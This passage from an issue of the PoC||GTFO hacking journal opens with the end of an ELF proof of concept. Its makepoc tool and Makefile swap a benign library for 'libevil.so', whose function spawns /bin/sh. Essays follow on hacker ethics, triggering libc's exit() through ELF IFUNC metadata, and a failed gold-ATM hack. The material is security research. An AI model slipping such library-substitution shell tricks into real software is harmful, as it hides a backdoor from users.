might</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">not like the output of your compiler</span><br/><span epub:type="pagebreak" id="page_26"/>144&#160;&#160;&#160;&#160;assert(f);<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;// <span class="codeitalic">Read the entire file</span><br/>146&#160;&#160;&#160;&#160;filesz = fread(file ,1,sizeof file,f);<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;fclose(f);<br/>148&#160;&#160;}<br/>&#160;&#160;&#160;&#160;&#160;void writefile(){<br/>150&#160;&#160;&#160;&#160;FILE *f= fopen("libpoc.so","w");<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;fwrite(file,sizeof file,1,f);<br/>152&#160;&#160;&#160;&#160;fclose(f);<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;system("chmod +x libpoc.so");<br/>154&#160;&#160;}<br/>&#160;&#160;&#160;&#160;&#160;Elf64_Phdr *find_dynamic(Elf64_Phdr *phdr){<br/>156&#160;&#160;&#160;&#160;//<span class="codeitalic">Find the PT_DYNAMIC program header</span><br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;for(;phdr-&gt;p_type != PT_DYNAMIC;phdr++);<br/>158&#160;&#160;&#160;&#160;return phdr;<br/>&#160;&#160;&#160;&#160;&#160;}<br/>160&#160;&#160;uint64_t find_dynstr(Elf64_Phdr *phdr){<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;//<span class="codeitalic">Find the address of the dynamic string table</span><br/>162&#160;&#160;&#160;&#160;phdr = find_dynamic(phdr);<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;Elf64_Dyn *dyn;<br/>164&#160;&#160;&#160;&#160;for(dyn = file + phdr-&gt;p_offset;<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;dyn-&gt;d_tag != DT_STRTAB; dyn++);<br/>166&#160;&#160;&#160;&#160;return dyn-&gt;d_un.d_ptr;<br/>&#160;&#160;&#160;&#160;&#160;}<br/>168&#160;&#160;int main()<br/>&#160;&#160;&#160;&#160;&#160;{<br/>170&#160;&#160;&#160;&#160;readfile();<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;elf_magic();<br/>172&#160;&#160;&#160;&#160;writefile();<br/>&#160;&#160;&#160;&#160;&#160;}</p>
<p class="programs">&#160;1 # -------------------- Makefile -----------------------<br/>&#160;&#160;&#160;&#160;%.so: %.c<br/>&#160;3&#160;&#160;&#160;gcc&#160;&#160;-fpic -shared&#160;&#160;-Wl,-soname,$@ -o $@ $^<br/>&#160;&#160;&#160;&#160;all: libgood.so&#160;&#160;libevil.so makepoc target libpoc.so<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;all_is_well<br/>&#160;5<br/>&#160;&#160;&#160;&#160;libpoc.so: target.handchecked&#160;&#160;&#160;makepoc<br/>&#160;&#160;7&#160;&#160;&#160;./makepoc<br/>&#160;&#160;&#160;&#160;clean:<br/>&#160;9&#160;&#160;&#160;rm -f *.so *.o target makepoc all_is_well<br/>&#160;&#160;&#160;&#160;target: target.c libgood.so libevil.so<br/>11&#160;&#160;&#160;echo "#define INTERP \"'objcopy -O&#160;&#160;binary -j .interp \<br/>&#160;&#160;&#160;&#160;&#160;&#160;/bin/ls /dev/stdout'\"" &gt;&gt; interp.inc &#38;&#38; gcc -o target \<br/>13&#160;&#160;&#160;-Os -Wl,-rpath,. -Wl,-efoo -L . -shared -fPIC -lgood target.<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c \<br/><span epub:type="pagebreak" id="page_27"/>&#160;&#160;&#160;&#160;&#160;&#160;&#38;&#38; strip -K foo $@ &#38;&#38; echo 'copy target to target.<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;handchecked by hand!'<br/>15<br/>&#160;&#160;&#160;target.handchecked: target<br/>17&#160;&#160;&#160;cp $&lt; $@; echo "Beware, you compiled target yourself.&#160;&#160;\<br/>&#160;&#160;&#160;&#160;&#160;&#160;YMMV with your compiler, this is just a friendly poc "<br/>19<br/>&#160;&#160;&#160;all_is_well: all_is_well.c libpoc.so<br/>21&#160;&#160;&#160;gcc -o $@ -Wl,-rpath,. -lpoc -L. $&lt;<br/>&#160;&#160;&#160;makepoc: makepoc.c<br/>23&#160;&#160;&#160;gcc -ggdb -o $@ $ &lt;</p>
<p class="programs">&#160;&#160;&#160;/* -------------------- <span class="codeitalic">target.c</span> -----------------------*/<br/>&#160;2 #include &lt;stdio.h&gt;<br/>&#160;&#160;&#160;#include "interp.inc"<br/>&#160;4 const char my_interp[]<br/>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;__attribute__((section(".interp"))) =&#160;&#160;INTERP;<br/>&#160;6 extern int func();<br/>&#160;&#160;&#160;int foo(){<br/>&#160;8&#160;&#160;&#160;//&#160;&#160;<span class="codeitalic">printf("Calling func\n");</span><br/>&#160;&#160;&#160;&#160;&#160;func();<br/>10&#160;&#160;&#160;exit(1); //<span class="codeitalic">Needed, because there is no crt.o</span><br/>&#160;&#160;&#160;}</p>
<p class="programs">&#160;1 /* -------------------- <span class="codeitalic">libgood.c</span> -----------------------*/<br/>&#160;&#160;&#160;#include &lt;stdio.h&gt;<br/>&#160;3 int func(){ printf("Hello World\n");}</p>
<p class="programs">&#160;&#160;&#160;/* -------------------- <span class="codeitalic">libevil.c</span> -----------------------*/<br/>&#160;2 #include &lt;stdio.h&gt;<br/>&#160;&#160;&#160;int func(){ system("/bin/sh");}</p>
<p class="programs">&#160;1 /* ----------------- <span class="codeitalic">all_is_well.c</span> ---------------------*/<br/>&#160;&#160;&#160;extern int foo();<br/>&#160;3 int main(int argc, char **argv) {<br/>&#160;&#160;&#160;&#160;&#160;foo();<br/>&#160;5 }</p>
<div class="image"><span epub:type="pagebreak" id="page_28"/><img src="../images/f0028_01.jpg" alt="Image"/></div>
<h3 class="h3" id="ch00lev1sec4"><strong>0:3.1 Neighborly Greetings and \<em>cite{}</em>s:</strong></h3>
<p class="noindent">Our gratitude goes to Silvio Cesare, the Grugq, Klog, Mayhem, and Nergal, whose brilliant articles in Phrack and elsewhere taught us about the ELF format, runtime, and ABI. Special thanks go to the ERESI team, who set a high standard of ELF (re)engineering to follow. Uninformed 6:3 by Skape led us to re-examine ELF in the light of weird machines, and we thank .Bx for showing how to build those to full generality. Last but not least, our view was profoundly shaped by Len Sassaman and Meredith L. Patterson&#8217;s amazing insights on parser differentials and their work with Dan Kaminsky to explore them for X.509 and other Internet protocols and formats.</p>
<h3 class="h3" id="ch00lev1sec5"><span epub:type="pagebreak" id="page_29"/><strong>0:4 Pastor Manul Laphroaig&#8217;s First Epistle to Hacker Preachers of All Hats, in the sincerest hope that we might shut up about hats, and get back to hacking.</strong></h3>
<p class="att"><em>by P.M.L.</em></p>
<p class="indent">First, I must caution you to cut out the Sun Tsu quotes. While every good speaker indulges in quoting from good books of fiction or philosophy, verily I warn you that this can lead to unrighteousness! For when we tell beginners to study ancient philosophy instead of engineering, they will become experts in the Art of War and not in the Art of Assembly Language! They find themselves reading Wikiquote instead of Phrack, and we are all the poorer for it!</p>
<p class="indent">I beg you: Rather than beginning your sermons with a quote from Sun Tzu, begin them with nifty little tricks which the laity can investigate later. For example, did you know that &#8220;<span class="literal">strings-n 20 ~/.bitcoin/blk0001.dat</span>&#8221; dumps ASCII art portraits of both Saint Sassaman and Ben Bernanke? This art was encoded as fake public keys used in real transactions, and it can&#8217;t be removed without undoing all Bitcoin transactions since it was inserted into the chain. The entire Bitcoin economy depends upon the face of the chairman of the Fed not being removed from its ledger! Isn&#8217;t that clever?</p>
<p class="indent">Speaking of cleverness, show respect for it by citing your scripture in chapter and verse. Phrack 49:14 tells us of Aleph1&#8217;s heroic struggle to explain the way the stack really works, and Uninformed 6:2 is the harrowing tale of Johnny Cache, H D Moore, and Skape exploiting the Windows kernel&#8217;s Wifi drivers with beacon <span epub:type="pagebreak" id="page_30"/>frames and probe responses. These papers are memories to be cherished, and they are stories worth telling. So tell them! Preach the good word of how the hell things actually work at every opportunity!</p>
<p class="indent">Don&#8217;t just preach the gospel, give the good word on paper. Print a dozen copies of a nifty paper and give them away at the next con. Do this at Recon, and you will make fascinating friends who will show you things you never knew, no matter how well you knew them before. Do this at RSA&#8212;without trying to sell anything&#8212;and you&#8217;ll be a veritable hero of enlightenment in an expo center of half-assed sales pitches and booth babes. Kill some trees to save some souls!</p>
<p class="indent">Don&#8217;t just give papers that others have written. Give early drafts of your own papers, or better still your own documented 0day. Nothing demonstrates neighborliness like the gift of a good exploit.</p>
<p class="indent">Further, I must warn you to ignore this Black Hat / White Hat nonsense. As a Straw Hat, I tell you that it is not the color of the hat that counts; rather, it is the weave. We know damned well that patching a million bugs won&#8217;t keep the bad guys out, just as we know that the vendor who covers up a bug caused by his own incompetence is hardly a good guy. We see righteousness in cleverness, and we study exploits because they are so damnably clever! It is a heroic act to build a debugger or a disassembler, and the knowledge of how to do so ought to be spread far and wide.</p>
<p class="indent">First, consider the White Hats. Black Hats are quick to judge these poor fellows as do-gooders who kill bugs. They ask, &#8220;Who would want to kill such a lovely bug, one which gives us such clever exploits?&#8221; Verily I tell you that death is a necessary part of the ecosystem. Without neighbors squashing old bugs, what incentive would there be to find more clever bugs or to write more <span epub:type="pagebreak" id="page_31"/>clever exploits? Truly I say to the Black Hats, you have recouped every dollar you&#8217;ve lost on bugfixes by the selective pressure that makes your exploits valuable enough to sustain a market!</p>
<p class="indent">Next, consider the Black Hats. White Hat neighbors are so quick to judge these poor fellows, not so much for selling their exploits as for hoarding their knowledge. A neighbor once said to me, &#8220;Look at these sinners! They hide their knowledge like a candle beneath a basket, such that none can learn from it.&#8221; But don&#8217;t be so quick to judge! While it&#8217;s true that the Black Hats publish more slowly, do not mistake this for not publishing. For does not a candle, when hidden beneath a basket, soon set the basket alight and burn ten times as bright? And is not self-replicating malware just a self-replicating whitepaper, written in machine language for the edification of those who read it? Verily I tell you, even the Black Hats have a neighborliness to them.</p>
<p class="noindentt">So please, shut up about hats and get back to the code.</p>
<p class="noindentt">&#8212;M. Laphroaig</p>
<div class="image1"><img src="../images/f0031_01.jpg" alt="Image"/></div>
<p class="noindent">Postscript: This little light of mine, I&#8217;m gonna let it shine!</p>
<h3 class="h3" id="ch00lev1sec6"><span epub:type="pagebreak" id="page_32"/><strong>0:5 Returning from ELF to Libc</strong></h3>
<p class="att"><em>by Rebecca &#8220;Bx&#8221; Shapiro</em></p>
<p class="noindent">Dear friends,</p>
<p class="indent">As you may or may not know, demons lurk within ELF metadata. If you have not yet been introduced to these creatures, please put this paper down and take a look at either our talk given at 29C3, or our soon-to-be released WOOT publication.<sup><a id="ch00fn_9"/><a href="footnote.xhtml#ch00fn9">9</a></sup></p>
<p class="indent">Although the ability to treat the loader as a Turing-complete machine is Pretty_Neat, we realize that there are a lot of useful computation vectors built right into the libraries that are mapped into the loader and executable&#8217;s address space. Instead of reinventing the wheel, in this sermon we&#8217;d like to begin exploring how to harness the power given to us by the perhaps almighty Libc.</p>
<p class="indent">The System V amd64 ABI scripture<sup><a id="ch00fn_10"/><a href="footnote.xhtml#ch00fn10">10</a></sup> in combination with the <span class="literal">eglibc-2.17</span> writings have provided us ELF demon-tamers with the mighty useful <span class="literal">IFUNC</span> symbol. Any symbol of type <span class="literal">IFUNC</span> is treated as an indirect function&#8212;the symbol&#8217;s value is treated as a function, which takes no arguments, and whose return value is the patch.</p>
<p class="indent">The question we will explore from here on is: Can we harness the power of the <span class="literal">IFUNC</span> to invoke a piece of Libc?</p>
<p class="indent">After vaguely thinking about this problem for a couple of months, we have finally made progress towards the answer.</p>
<p class="indent">Consider the <span class="literal">exit()</span> library call. Although one may question why we would want to craft metadata that causes a <span class="literal">exit()</span> to be invoked, we will do so anyway, because it is one of the simplest calls we can make, because the single argument it takes is not particularly important, and success is immediately obvious.</p>
<p class="indent"><span epub:type="pagebreak" id="page_33"/>To invoke <span class="literal">exit()</span>, we must lookup the following information when we are compiling the crafted metadata into some host executable. This is accomplished in three steps, as we explain in our prior work.</p>
<ol>
<li><p class="noindentl">The location of <span class="literal">exit()</span> in the Libc binary.</p></li>
<li><p class="noindentl">The location of the host executable&#8217;s dynamic symbol table.</p></li>
<li><p class="noindentl">The location of the host executable&#8217;s dynamic relocation table.</p></li>
</ol>
<p class="indent">To invoke <span class="literal">exit()</span>, we must accomplish the following during runtime:</p>
<ol>
<li><p class="noindentl">Lookup the base address of Libc.</p></li>
<li><p class="noindentl">Use this base address to calculate the location of <span class="literal">exit()</span> in memory.</p></li>
<li><p class="noindentl">Store the address of <span class="literal">exit()</span> in a dynamic <span class="literal">IFUNC</span> symbol.</p></li>
<li><p class="noindentl">Cause the symbol to be resolved.</p></li>
</ol>
<p class="indent">. . . and then there was <span class="literal">exit()</span>!</p>
<p class="indentt">Our prior work has demonstrated how to accomplish the first two tasks. Once the first two tasks have been completed at runtime, we find ourselves with a normal symbol (which we will call symbol 0) whose value is the location of <span class="literal">exit()</span>. At this point we have two ways to proceed: we can either</p>
<p class="indent">(1) have a second dynamic symbol (named symbol 1) of type <span class="literal">IFUNC</span> and have relocation entry of type <span class="literal">R_X86_64_64</span> which <span epub:type="pagebreak" id="page_34"/>refers to symbol 0 and whose offset is set to the location of symbol 1&#8217;s values, causing the location of <span class="literal">ext()</span> to be copied into symbol 1, or we could</p>
<p class="indent">(2) update the type of the symbol that already has the address of <span class="literal">exit()</span> to that it becomes an <span class="literal">IFUNC</span>. This can be done in a single relocation entry of type <span class="literal">R_X86_64</span>, whose addend is that which is copied to the first 8 bytes of symbol 0. If we set the addend to <span class="literal">0x0100000a00000000</span>, we will find that the symbol type will become 0x0a (<span class="literal">IFUNC</span>), the symbol <span class="literal">shndx</span> will be set as 01 so the <span class="literal">IFUNC</span> is treated as defined, and the other fields in the symbol structure will remain the same.</p>
<p class="indent">After our metadata that sets up the <span class="literal">IFUNC</span>, we need a relocation entry of type <span class="literal">R_X86_64_64</span> that references our <span class="literal">IFUNC</span> symbol, which will cause <span class="literal">exit()</span> to be invoked.</p>
<p class="indent">At this moment, you may be wondering how it may be possible to do more interesting things such as have control of the argument passed to the function call. It turns out that this problem is still being researched.<sup><a id="ch00fn_11"/><a href="footnote.xhtml#ch00fn11">11</a></sup> In <span class="literal">eglibc-2.17</span>, at the time the <span class="literal">IFUNC</span> is called, the first argument is and will always be 0, the second argument is the address of the function being called, and the third argument the addressed of the symbol being referenced. Therefore at this level <span class="literal">exec(0)</span> is always called. It will clearly take some clever redirection magic to be able to have control over the function&#8217;s arguments purely from ELF metadata.</p>
<p class="indent">Perhaps you will see this as an opportunity to go on a quest of ELF-discovery and be able to take this work to the next level. If you do discover a path to argument control, we hope you will take the time to share your thoughts with the wider community.</p>
<p class="indent">Peace out, and may the Manul always be with you.</p>
<h3 class="h3" id="ch00lev1sec7"><span epub:type="pagebreak" id="page_35"/><strong>0:6 GTFO or #FAIL</strong></h3>
<p class="att"><em>by FX of Phenoelit</em></p>
<p class="indent">To honor the memory of the great Barnaby Jack, we would like to relate the events of a failed proof of concept. It happened on the second day of the Black Hat Abu Dhabi conference in 2010 that the hosts, impressed by Barnaby&#8217;s presentation on ATMs, pointed out that the Emirates Palace hotel features a gold ATM. So they asked him to see if he could hack that one too.</p>
<p class="indent">Never one to reject challenges or fun to be had, Barns gathered a bunch of fellow hackers, who shall remain anonymous in this short tale, to accompany him to the gold ATM. Suffice it to say, yours truly was among them. Thus it happened that a bunch of hackers and a number of hosts in various white and pastel colored thawbs went to pay the gold ATM a visit. Our hosts had assured everyone in the group that it was totally OK for us to hack the machine, as long as they were with us.</p>
<h4 class="h4" id="ch00lev2sec4"><strong>The PoC</strong></h4>
<p class="noindent">While the gold ATM, being plated with gold itself, looked rather solid, a look at the back of the machine revealed a messy knot of cables, the type of wiring normally found on a Travis Goodspeed desk. Since the machine updates the gold pricing information online, we obviously wanted to have a look at the traffic. We therefore disconnected the flimsy network connections and observed the results, of which there were initially none to be observed, except for the machine to start beeping in an alarming way.</p>
<p class="indent">Nothing being boring, we decided to power cycle the machine and watch it boot. For that, yours truly got behind it and used his considerable power cable unplugging skills to their fullest extent. Interestingly enough, the gold ATM stayed operational, <span epub:type="pagebreak" id="page_36"/>obviously being equipped with the only Uninterruptable Power Source (UPS) in the world that actually provides power when needed.</p>
<p class="indent">Reappearing from behind the machine, happily holding the unplugged network and power cables, yours truly observed the group of hosts being already far away and the group of hackers following close behind. Inverting their vector of movement, the cause of the same became obvious with the approaching storm troopers of Blackwater quality and quantity. Therefore, yours truly joined the other hackers at considerable speed.</p>
<h4 class="h4" id="ch00lev2sec5"><strong>The FAIL</strong></h4>
<p class="noindent">Needless to say, what followed was a tense afternoon of drinking, waiting, and considering exit scenarios from a certain country, depending on individual citizenship, while powers that be were busy turning the incident into a non-issue.</p>
<p class="indent">The #FAIL was quickly identified as the inability of the fellowship of hackers to determine rank and therefore authority of people that all wear more or less the same garments. What had happened was that the people giving authority to hack the machine actually did not possess said authority in the first place or, alternatively, had pissed off someone with more authority.</p>
<p class="indent">The failed PoC pointed out the benefits of western military uniforms and their rank insignia quite clearly.</p>
<h4 class="h4" id="ch00lev2sec6"><strong>Neighborly Greetings</strong></h4>
<p class="noindent">Neighborly greetings are in order to Mr. Nils, who, upon learning about the incident, quietly handed the local phone number of the German embassy to yours truly.<sup><a id="ch00fn_12"/><a href="footnote.xhtml#ch00fn12">12</a></sup></p>
</body>
</html>
